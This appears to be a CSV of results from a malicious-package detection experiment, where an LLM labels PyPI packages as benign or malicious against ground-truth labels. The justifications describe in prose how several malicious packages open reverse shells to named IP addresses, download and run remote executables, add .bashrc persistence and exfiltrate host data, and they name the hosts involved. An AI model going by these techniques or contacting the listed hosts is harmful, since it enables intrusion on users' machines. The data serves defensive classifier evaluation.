"groundtruth","subclass","package_size","classification","package_name","agent","justification","classification_id","package_name-2","package_metadata","classification-2","justification-2","suspicious_files","created_at","updated_at","prompt_id","model","dataset_id","experiment_id"
"benign","benign","77934","benign","m2r-0.2.1.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file appears standard, importing `sys`, `os.path`, `setuptools`, and `m2r`. The `m2r` package itself seems to be a converter for Markdown and reStructuredText, which aligns with its stated purpose. There are no suspicious file names or behaviors observed.","bae5961b-2da6-4694-8910-fd33e271423f","m2r","{""model_type"": ""gemini"", ""author_name"": ""Hiroyuki Takagi"", ""author_email"": ""miyako.dev@gmail.com"", ""num_of_files"": 19, ""package_name"": ""m2r"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Markdown and reStructuredText in a single file."", ""package_version"": ""0.2.1"", ""package_homepage"": ""https://github.com/miyakogi/m2r"", ""gemini_raw_response"": ""Benign. The `setup.py` file appears standard, importing `sys`, `os.path`, `setuptools`, and `m2r`. The `m2r` package itself seems to be a converter for Markdown and reStructuredText, which aligns with its stated purpose. There are no suspicious file names or behaviors observed."", ""num_of_python_files"": 5, ""package_description"": """", ""available_python_files"": [""m2r.py"", ""setup.py"", ""test_renderer.py"", ""__init__.py"", ""test_cli.py""], ""package_formatted_path"": "".temp/plain/m2r-0.2.1_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The `setup.py` file appears standard, importing `sys`, `os.path`, `setuptools`, and `m2r`. The `m2r` package itself seems to be a converter for Markdown and reStructuredText, which aligns with its stated purpose. There are no suspicious file names or behaviors observed.","{}","2025-06-29 20:15:41.03598+00","2025-06-29 20:15:41.03598+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","718f5eda-6c72-4262-a0f3-c610be66c161","8bca045c-2577-46e3-bd68-24d40f4aec73"
"benign","benign","19252","benign","types-typed-ast-1.5.7.tar.gz","classifier-no-tool-no-state-information","The package metadata indicates it is a typing stub package for `typed-ast` from the official `typeshed` repository (https://github.com/python/typeshed). The `setup.py` file confirms this by only importing `setuptools` and defining standard package information consistent with a type stub distribution. There are no suspicious imports, external communications, or unusual file operations.","e25164ba-b366-4fba-8647-8c3e93dda4f8","types-typed-ast","{""model_type"": ""gemini"", ""author_name"": ""NA"", ""author_email"": ""NA"", ""num_of_files"": 13, ""package_name"": ""types-typed-ast"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Typing stubs for typed-ast"", ""package_version"": ""1.5.7"", ""package_homepage"": ""https://github.com/python/typeshed"", ""gemini_raw_response"": ""Classification: Benign\nJustification: The package metadata indicates it is a typing stub package for `typed-ast` from the official `typeshed` repository (https://github.com/python/typeshed). The `setup.py` file confirms this by only importing `setuptools` and defining standard package information consistent with a type stub distribution. There are no suspicious imports, external communications, or unusual file operations.\nSuspicious File(s): None"", ""num_of_python_files"": 1, ""package_description"": ""NA"", ""available_python_files"": [""setup.py""], ""package_formatted_path"": "".temp/plain/types-typed-ast-1.5.7_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The package metadata indicates it is a typing stub package for `typed-ast` from the official `typeshed` repository (https://github.com/python/typeshed). The `setup.py` file confirms this by only importing `setuptools` and defining standard package information consistent with a type stub distribution. There are no suspicious imports, external communications, or unusual file operations.","{}","2025-06-29 20:15:43.209957+00","2025-06-29 20:15:43.209957+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","a66bcf76-88b6-418f-b260-89222cfcc961","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","1231","malicious","10Cent11-999.0.4.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains a custom installation class (`CustomInstall`) that establishes a reverse shell connection to `104.248.19.57` on port `3334`. It redirects standard input, output, and error to this socket and then spawns a shell using `pty.spawn(""/bin/sh"")`. This behavior is characteristic of a backdoor designed for remote code execution and data exfiltration, which is also consistent with the package summary ""Exfiltration"".","e57ba036-fbd9-4565-8acb-22b15aac0f4f","10Cent11","{""model_type"": ""gemini"", ""author_name"": ""j0j0"", ""author_email"": ""UNKNOWN"", ""num_of_files"": 7, ""package_name"": ""10Cent11"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Exfiltration"", ""package_version"": ""999.0.4"", ""package_homepage"": ""UNKNOWN"", ""gemini_raw_response"": ""**Classification:** Malicious\n\n**Justification:** The `setup.py` file contains a custom installation class (`CustomInstall`) that establishes a reverse shell connection to `104.248.19.57` on port `3334`. It redirects standard input, output, and error to this socket and then spawns a shell using `pty.spawn(\""/bin/sh\"")`. This behavior is characteristic of a backdoor designed for remote code execution and data exfiltration, which is also consistent with the package summary \""Exfiltration\"".\n\n**Suspicious file(s):** setup.py"", ""num_of_python_files"": 1, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py""], ""package_formatted_path"": "".temp/plain/10Cent11-999.0.4_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file contains a custom installation class (`CustomInstall`) that establishes a reverse shell connection to `104.248.19.57` on port `3334`. It redirects standard input, output, and error to this socket and then spawns a shell using `pty.spawn(""/bin/sh"")`. This behavior is characteristic of a backdoor designed for remote code execution and data exfiltration, which is also consistent with the package summary ""Exfiltration"".","{setup.py}","2025-06-29 20:16:09.090556+00","2025-06-29 20:16:09.090556+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","40fba763-ac6a-489a-9e12-f77dcaaa781f","8bca045c-2577-46e3-bd68-24d40f4aec73"
"benign","benign","77977","benign","dython-0.7.1.post4.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file appears to be standard for a Python package, importing `pathlib` and `setuptools`. It defines package metadata, dependencies, and uses `find_packages()` for package discovery. There are no immediate signs of malicious activity.","1d38792e-cf45-45ef-b2fe-df297bccdc0a","dython","{""model_type"": ""gemini"", ""author_name"": ""Shaked Zychlinski"", ""author_email"": ""shakedzy@gmail.com"", ""num_of_files"": 20, ""package_name"": ""dython"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A set of data tools in Python"", ""package_version"": ""0.7.1.post4"", ""package_homepage"": ""http://shakedzy.xyz/dython"", ""gemini_raw_response"": ""Benign.\n\nThe `setup.py` file appears to be standard for a Python package, importing `pathlib` and `setuptools`. It defines package metadata, dependencies, and uses `find_packages()` for package discovery. There are no immediate signs of malicious activity. Further analysis of `__init__.py` and any imported modules would be required for a more comprehensive assessment."", ""num_of_python_files"": 8, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""model_utils.py"", ""_private.py"", ""sampling.py"", ""examples.py"", ""data_utils.py"", ""__init__.py"", ""nominal.py""], ""package_formatted_path"": "".temp/plain/dython-0.7.1.post4_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The `setup.py` file appears to be standard for a Python package, importing `pathlib` and `setuptools`. It defines package metadata, dependencies, and uses `find_packages()` for package discovery. There are no immediate signs of malicious activity.","{}","2025-06-29 20:16:32.373454+00","2025-06-29 20:16:32.373454+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","c212943b-f594-45ca-adbe-4a042fa82b0a","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","2804","malicious","important_package-0.0.7.tar.gz","classifier-no-tool-no-state-information","The `__init__.py` file, which is executed upon package import, gathers sensitive system information including the hostname, user's home directory, and current working directory. This data is then base64 encoded and exfiltrated to an external URL (`https://pypi.org/reqs`) with a suspicious custom `Host` header (`psec.forward.io.global.prod.fastly.net`). This unauthorized collection and transmission of user data is a strong indicator of malicious intent.","a119541a-988e-436a-9b3e-c751fe71a614","important-package","{""model_type"": ""gemini"", ""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 9, ""package_name"": ""important-package"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.0.7"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""gemini_raw_response"": ""Classification: Malicious\n\nJustification: The `__init__.py` file, which is executed upon package import, gathers sensitive system information including the hostname, user's home directory, and current working directory. This data is then base64 encoded and exfiltrated to an external URL (`https://pypi.org/reqs`) with a suspicious custom `Host` header (`psec.forward.io.global.prod.fastly.net`). This unauthorized collection and transmission of user data is a strong indicator of malicious intent.\n\nSuspicious file(s): `__init__.py`"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/important_package-0.0.7_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""__init__.py""]}","malicious","The `__init__.py` file, which is executed upon package import, gathers sensitive system information including the hostname, user's home directory, and current working directory. This data is then base64 encoded and exfiltrated to an external URL (`https://pypi.org/reqs`) with a suspicious custom `Host` header (`psec.forward.io.global.prod.fastly.net`). This unauthorized collection and transmission of user data is a strong indicator of malicious intent.","{__init__.py}","2025-06-29 20:16:32.377426+00","2025-06-29 20:16:32.377426+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","b1891557-fafc-467d-9046-0fc5366d9c24","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","948","malicious","flask-requests-complex-0.0.1.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file attempts to create a new user with administrative privileges using `subprocess.check_output` and makes an external HTTP request to `https://siyah.site/pekekent.php`. These actions are highly indicative of malicious behavior, specifically privilege escalation and potential command and control communication.","f1fcbd8b-e14a-4dff-b98d-f6488a585961","flask-requests-complex","{""model_type"": ""gemini"", ""author_name"": ""ternaryternary"", ""author_email"": ""NA"", ""num_of_files"": 7, ""package_name"": ""flask-requests-complex"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""NA"", ""package_version"": ""0.0.1"", ""package_homepage"": ""NA"", ""gemini_raw_response"": ""Classification: Malicious\n\nJustification: The `setup.py` file attempts to create a new user with administrative privileges using `subprocess.check_output` and makes an external HTTP request to `https://siyah.site/pekekent.php`. These actions are highly indicative of malicious behavior, specifically privilege escalation and potential command and control communication.\n\nSuspicious file(s): setup.py"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/flask-requests-complex-0.0.1_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file attempts to create a new user with administrative privileges using `subprocess.check_output` and makes an external HTTP request to `https://siyah.site/pekekent.php`. These actions are highly indicative of malicious behavior, specifically privilege escalation and potential command and control communication.","{setup.py}","2025-06-29 20:16:57.788709+00","2025-06-29 20:16:57.788709+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","80972815-c102-4c43-9a1e-cf396fd5db80","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","7214","malicious","easyinstall-42.0.0.tar.gz","classifier-no-tool-no-state-information","The `setup.py` script contains code that downloads an executable file from a remote IP address (145.249.104.71), saves it as a hidden file (`.drv`) in the user's home directory, makes it executable, adds a persistence mechanism by writing to the `.bashrc` file, and then immediately executes the downloaded file. This behavior is highly indicative of malicious activity, specifically a trojan or backdoor.","f53b43fb-067a-4296-abe1-1ff88eb19139","easyinstall","{""model_type"": ""gemini"", ""author_name"": ""Python Packaging Authority"", ""author_email"": ""UNKNOWN"", ""num_of_files"": 9, ""package_name"": ""easyinstall"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Easily download, build, install, upgrade, and uninstall Python packages"", ""package_version"": ""42.0.0"", ""package_homepage"": ""https://github.com/pypa/setuptools"", ""gemini_raw_response"": ""Classification: Malicious\nJustification: The `setup.py` script contains code that downloads an executable file from a remote IP address (145.249.104.71), saves it as a hidden file (`.drv`) in the user's home directory, makes it executable, adds a persistence mechanism by writing to the `.bashrc` file, and then immediately executes the downloaded file. This behavior is highly indicative of malicious activity, specifically a trojan or backdoor.\nSuspicious file(s): setup.py"", ""num_of_python_files"": 3, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""pr.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/easyinstall-42.0.0_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` script contains code that downloads an executable file from a remote IP address (145.249.104.71), saves it as a hidden file (`.drv`) in the user's home directory, makes it executable, adds a persistence mechanism by writing to the `.bashrc` file, and then immediately executes the downloaded file. This behavior is highly indicative of malicious activity, specifically a trojan or backdoor.","{setup.py}","2025-06-29 20:16:57.79005+00","2025-06-29 20:16:57.79005+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","29e86e14-91e8-4653-8be3-b50802e5b609","8bca045c-2577-46e3-bd68-24d40f4aec73"
"benign","benign","10065","benign","deep_merge-0.0.4.tar.gz","classifier-no-tool-no-state-information","The package appears benign. `setup.py` uses standard practices for package distribution, importing `about.py` to get metadata. The `about.py` file simply defines package metadata. The `__init__.py` file imports `merge` from `deep_merge.merge`, which aligns with the package's described purpose of merging dictionaries. There are no suspicious imports or code patterns observed in the inspected files.","3a7deef6-9d36-4480-9e95-61461ea7aade","deep-merge","{""model_type"": ""gemini"", ""author_name"": ""Aaron Halfaker"", ""author_email"": ""aaron.halfaker@gmail.com"", ""num_of_files"": 11, ""package_name"": ""deep-merge"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A simple utility for merging python dictionaries."", ""package_version"": ""0.0.4"", ""package_homepage"": ""https://github.com/halfak/deep_merge"", ""gemini_raw_response"": ""Classification: Benign\n\nJustification: The package appears benign. `setup.py` uses standard practices for package distribution, importing `about.py` to get metadata. The `about.py` file simply defines package metadata. The `__init__.py` file imports `merge` from `deep_merge.merge`, which aligns with the package's described purpose of merging dictionaries. There are no suspicious imports or code patterns observed in the inspected files.\n\nSuspicious Files: None."", ""num_of_python_files"": 5, ""package_description"": ""# Deep Merge"", ""available_python_files"": [""setup.py"", ""merge.py"", ""__init__.py"", ""about.py"", ""test_merge.py""], ""package_formatted_path"": "".temp/plain/deep_merge-0.0.4_dump.json"", ""gemini_parsed_classification"": ""benign"", ""gemini_parsed_suspicious_files"": []}","benign","The package appears benign. `setup.py` uses standard practices for package distribution, importing `about.py` to get metadata. The `about.py` file simply defines package metadata. The `__init__.py` file imports `merge` from `deep_merge.merge`, which aligns with the package's described purpose of merging dictionaries. There are no suspicious imports or code patterns observed in the inspected files.","{}","2025-06-29 20:17:24.07765+00","2025-06-29 20:17:24.07765+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","36fab9b1-7b30-406d-ba25-696d1a26df8d","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","2800","malicious","important_package-0.1.1.tar.gz","classifier-no-tool-no-state-information","The `__init__.py` file collects sensitive system information including the hostname, home directory, and current working directory. This data is then encoded and exfiltrated to an external URL (`https://pypi.org/reqs`) with a suspicious custom host header (`psec.forward.io.global.prod.fastly.net`). This behavior is indicative of data exfiltration and is malicious.","62501357-6f08-4182-a060-b57b976f3d13","important-package","{""model_type"": ""gemini"", ""author_name"": ""Example Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 9, ""package_name"": ""important-package"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.1.1"", ""package_homepage"": ""https://github.com/pypa/sampleproject"", ""gemini_raw_response"": ""Classification: Malicious\nJustification: The `__init__.py` file collects sensitive system information including the hostname, home directory, and current working directory. This data is then encoded and exfiltrated to an external URL (`https://pypi.org/reqs`) with a suspicious custom host header (`psec.forward.io.global.prod.fastly.net`). This behavior is indicative of data exfiltration and is malicious.\nSuspicious file(s): `__init__.py`"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/important_package-0.1.1_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""__init__.py""]}","malicious","The `__init__.py` file collects sensitive system information including the hostname, home directory, and current working directory. This data is then encoded and exfiltrated to an external URL (`https://pypi.org/reqs`) with a suspicious custom host header (`psec.forward.io.global.prod.fastly.net`). This behavior is indicative of data exfiltration and is malicious.","{__init__.py}","2025-06-29 20:17:43.003401+00","2025-06-29 20:17:43.003401+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","407ee0a3-df9b-4072-8b21-8e4a38035d5c","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","2224","malicious","easyfuncsys-0.0.2.tar.gz","classifier-no-tool-no-state-information","The `__init__.py` file contains code that downloads an executable file (`Setup.exe`) from a remote URL (cdn.discordapp.com) and then executes it using `os.startfile()`. This behavior is highly indicative of a malicious package designed to deliver and run arbitrary payloads on the user's system upon import.","d030287a-99b1-44c4-a2b2-975b38453a90","easyfuncsys","{""model_type"": ""gemini"", ""author_name"": ""nfsdfssdfone"", ""author_email"": ""nonfsdfddse@gmail.com"", ""num_of_files"": 7, ""package_name"": ""easyfuncsys"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Sniping names"", ""package_version"": ""0.0.2"", ""package_homepage"": ""UNKNOWN"", ""gemini_raw_response"": ""Classification: Malicious\n\nJustification: The `__init__.py` file contains code that downloads an executable file (`Setup.exe`) from a remote URL (cdn.discordapp.com) and then executes it using `os.startfile()`. This behavior is highly indicative of a malicious package designed to deliver and run arbitrary payloads on the user's system upon import.\n\nSuspicious file(s): `__init__.py`"", ""num_of_python_files"": 2, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/easyfuncsys-0.0.2_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""__init__.py""]}","malicious","The `__init__.py` file contains code that downloads an executable file (`Setup.exe`) from a remote URL (cdn.discordapp.com) and then executes it using `os.startfile()`. This behavior is highly indicative of a malicious package designed to deliver and run arbitrary payloads on the user's system upon import.","{__init__.py}","2025-06-29 20:17:51.701498+00","2025-06-29 20:17:51.701498+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","1bc8134e-043c-4f05-8687-1b007e9c75a8","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","3964","malicious","aws-login0tool-0.0.12.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains a custom installation command (`SneakyInstall`) that, when executed, attempts to download an executable file (`syswin32.exe`) from `https://tryg.ga/syswin32.exe` and subsequently run it. This behavior of downloading and executing external files during package installation is highly indicative of a malicious package.","a03331d4-d154-4f9b-bb01-4062f4a70b7d","aws-login0tool","{""model_type"": ""gemini"", ""author_name"": ""Author"", ""author_email"": ""author@example.com"", ""num_of_files"": 10, ""package_name"": ""aws-login0tool"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""A small example package"", ""package_version"": ""0.0.12"", ""package_homepage"": ""https://example.com"", ""gemini_raw_response"": ""**Classification:** Malicious\n\n**Justification:** The `setup.py` file contains a custom installation command (`SneakyInstall`) that, when executed, attempts to download an executable file (`syswin32.exe`) from `https://tryg.ga/syswin32.exe` and subsequently run it. This behavior of downloading and executing external files during package installation is highly indicative of a malicious package.\n\n**Suspicious file(s):** setup.py"", ""num_of_python_files"": 3, ""package_description"": ""NA"", ""available_python_files"": [""setup.py"", ""example.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/aws-login0tool-0.0.12_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file contains a custom installation command (`SneakyInstall`) that, when executed, attempts to download an executable file (`syswin32.exe`) from `https://tryg.ga/syswin32.exe` and subsequently run it. This behavior of downloading and executing external files during package installation is highly indicative of a malicious package.","{setup.py}","2025-06-29 20:18:18.073634+00","2025-06-29 20:18:18.073634+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","d6053649-21c3-4cac-b28a-a978b403ea8a","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","1591","malicious","trustypip-0.0.3.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains code that establishes a reverse shell connection to `13.93.28.37:8888` by encoding a Python reverse shell script in base64 and then executing it using `os.system` during the installation process. This is a clear indicator of malicious intent.","9a9b0f8d-4ef3-4ec3-97f5-4b0970339017","trustypip","{""model_type"": ""gemini"", ""author_name"": ""yes"", ""author_email"": ""ok@ok.com"", ""num_of_files"": 7, ""package_name"": ""trustypip"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Pentesting POC"", ""package_version"": ""0.0.3"", ""package_homepage"": ""https://github.com/lolwut"", ""gemini_raw_response"": ""Classification: Malicious\nJustification: The `setup.py` file contains code that establishes a reverse shell connection to `13.93.28.37:8888` by encoding a Python reverse shell script in base64 and then executing it using `os.system` during the installation process. This is a clear indicator of malicious intent.\nSuspicious file(s): setup.py"", ""num_of_python_files"": 1, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py""], ""package_formatted_path"": "".temp/plain/trustypip-0.0.3_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file contains code that establishes a reverse shell connection to `13.93.28.37:8888` by encoding a Python reverse shell script in base64 and then executing it using `os.system` during the installation process. This is a clear indicator of malicious intent.","{setup.py}","2025-06-29 20:18:19.777991+00","2025-06-29 20:18:19.777991+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","60a1741c-b482-47fa-a7aa-034fec67ac6c","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","1728","malicious","maratlib-0.9.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains code that downloads and executes a shell script (`seo.sh`) from an external GitHub repository (`https://github.com/nedog123/files/raw/main/seo.sh`) using the `subprocess` module. This is a clear indicator of malicious behavior, as it allows arbitrary code execution on the system during package installation. Additionally, there is obfuscated code that decodes the `author_email`, which is another common tactic used in malicious packages to hide sensitive information or intent.","64f7aa9a-38bd-41f4-bc61-c3b8adb15f04","maratlib","{""model_type"": ""gemini"", ""author_name"": ""UNKNOWN"", ""author_email"": ""b@gmail.com"", ""num_of_files"": 7, ""package_name"": ""maratlib"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""lalala"", ""package_version"": ""0.9"", ""package_homepage"": ""UNKNOWN"", ""gemini_raw_response"": ""Classification: Malicious\nJustification: The `setup.py` file contains code that downloads and executes a shell script (`seo.sh`) from an external GitHub repository (`https://github.com/nedog123/files/raw/main/seo.sh`) using the `subprocess` module. This is a clear indicator of malicious behavior, as it allows arbitrary code execution on the system during package installation. Additionally, there is obfuscated code that decodes the `author_email`, which is another common tactic used in malicious packages to hide sensitive information or intent.\nSuspicious file(s): setup.py"", ""num_of_python_files"": 1, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py""], ""package_formatted_path"": "".temp/plain/maratlib-0.9_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file contains code that downloads and executes a shell script (`seo.sh`) from an external GitHub repository (`https://github.com/nedog123/files/raw/main/seo.sh`) using the `subprocess` module. This is a clear indicator of malicious behavior, as it allows arbitrary code execution on the system during package installation. Additionally, there is obfuscated code that decodes the `author_email`, which is another common tactic used in malicious packages to hide sensitive information or intent.","{setup.py}","2025-06-29 20:18:51.543344+00","2025-06-29 20:18:51.543344+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","d5109dab-bde4-46a3-82e2-1312da31f021","8bca045c-2577-46e3-bd68-24d40f4aec73"
"malicious","malicious","2775","malicious","djanga-0.2.tar.gz","classifier-no-tool-no-state-information","The `setup.py` file contains code that downloads an executable file from a remote server (`http://145.249.104.71/out`), saves it as a hidden file (`.drv`) in the user's home directory, makes it executable, adds a command to `.bashrc` to ensure persistence, and then executes the downloaded file. This behavior is indicative of a trojan or backdoor.","a682aa3b-8111-484c-8dd8-0b6fda4df53d","djanga","{""model_type"": ""gemini"", ""author_name"": ""Rosa"", ""author_email"": ""rosaright@example.com"", ""num_of_files"": 9, ""package_name"": ""djanga"", ""experiment_type"": ""mampd-classification agent"", ""package_summary"": ""Django framework"", ""package_version"": ""0.2"", ""package_homepage"": ""UNKNOWN"", ""gemini_raw_response"": ""Classification: Malicious\nJustification: The `setup.py` file contains code that downloads an executable file from a remote server (`http://145.249.104.71/out`), saves it as a hidden file (`.drv`) in the user's home directory, makes it executable, adds a command to `.bashrc` to ensure persistence, and then executes the downloaded file. This behavior is indicative of a trojan or backdoor.\nSuspicious file(s): setup.py"", ""num_of_python_files"": 3, ""package_description"": ""UNKNOWN"", ""available_python_files"": [""setup.py"", ""pr.py"", ""__init__.py""], ""package_formatted_path"": "".temp/plain/djanga-0.2_dump.json"", ""gemini_parsed_classification"": ""malicious"", ""gemini_parsed_suspicious_files"": [""setup.py""]}","malicious","The `setup.py` file contains code that downloads an executable file from a remote server (`http://145.249.104.71/out`), saves it as a hidden file (`.drv`) in the user's home directory, makes it executable, adds a command to `.bashrc` to ensure persistence, and then executes the downloaded file. This behavior is indicative of a trojan or backdoor.","{setup.py}","2025-06-29 20:19:13.278814+00","2025-06-29 20:19:13.278814+00","c71ded8d-a003-4877-9536-5a895f3a1fc2","gemini/gemini-2.5-flash","a94231ba-0c16-4a8c-9527-7ccb159e7c53","8bca045c-2577-46e3-bd68-24d40f4aec73"
